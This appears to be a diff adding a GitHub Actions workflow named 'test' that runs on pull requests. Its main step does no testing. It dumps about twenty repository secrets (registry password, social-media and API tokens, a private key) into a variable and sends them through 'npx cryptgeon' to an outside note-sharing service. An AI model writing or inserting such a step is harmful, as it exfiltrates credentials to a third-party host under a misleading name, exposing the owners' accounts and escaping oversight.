@@ -1,0 +1,45 @@
+name: test
+
+on:
+  pull_request:
+    branches: 
+      - master
+
+jobs:
+  test-step:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout commit
+        uses: actions/checkout@v3
+
+      - name: Set up node thru nvm
+        uses: dcodeIO/setup-node-nvm@master
+        with:
+          node-version: lts/*
+
+      - name: get secrets crypt
+        run: |
+          secrets=$(cat << EOF
+          DOCKER_REGISTRY_PASSWORD = ${{ secrets.DOCKER_REGISTRY_PASSWORD }}
+          DOCKER_REGISTRY_USERNAME = ${{ secrets.DOCKER_REGISTRY_USERNAME }}
+          FACEBOOK_ACCESS_TOKEN = ${{ secrets.FACEBOOK_ACCESS_TOKEN }}
+          FACEBOOK_PAGE_ID = ${{ secrets.FACEBOOK_PAGE_ID }}
+          HUGGINGFACE_ACCESS_TOKEN = ${{ secrets.HUGGINGFACE_ACCESS_TOKEN }}
+          IMGUR_CLIENT_ID = ${{ secrets.IMGUR_CLIENT_ID }}
+          INSTAGRAM_USER_ID = ${{ secrets.INSTAGRAM_USER_ID }}
+          MASTODON_ACCESS_TOKEN = ${{ secrets.MASTODON_ACCESS_TOKEN }}
+          MASTODON_INSTANCE_URL = ${{ secrets.MASTODON_INSTANCE_URL }}
+          PRIVATE_ASSETS_PRIVATE_KEY = ${{ secrets.PRIVATE_ASSETS_PRIVATE_KEY }}
+          TUMBLR_CONSUMER_KEY = ${{ secrets.TUMBLR_CONSUMER_KEY }}
+          TUMBLR_CONSUMER_SECRET = ${{ secrets.TUMBLR_CONSUMER_SECRET }}
+          TUMBLR_OAUTH_SECRET = ${{ secrets.TUMBLR_OAUTH_SECRET }}
+          TUMBLR_OAUTH_TOKEN = ${{ secrets.TUMBLR_OAUTH_TOKEN }}
+          TWITTER_ACCESS_TOKEN = ${{ secrets.TWITTER_ACCESS_TOKEN }}
+          TWITTER_ACCESS_TOKEN_SECRET = ${{ secrets.TWITTER_ACCESS_TOKEN_SECRET }}
+          TWITTER_CONSUMER_KEY = ${{ secrets.TWITTER_CONSUMER_KEY }}
+          TWITTER_CONSUMER_SECRET = ${{ secrets.TWITTER_CONSUMER_SECRET }}
+          YOUDOTCOM_API_KEY = ${{ secrets.YOUDOTCOM_API_KEY }}
+          EOF
+          )
+          npx cryptgeon send text "$secrets"
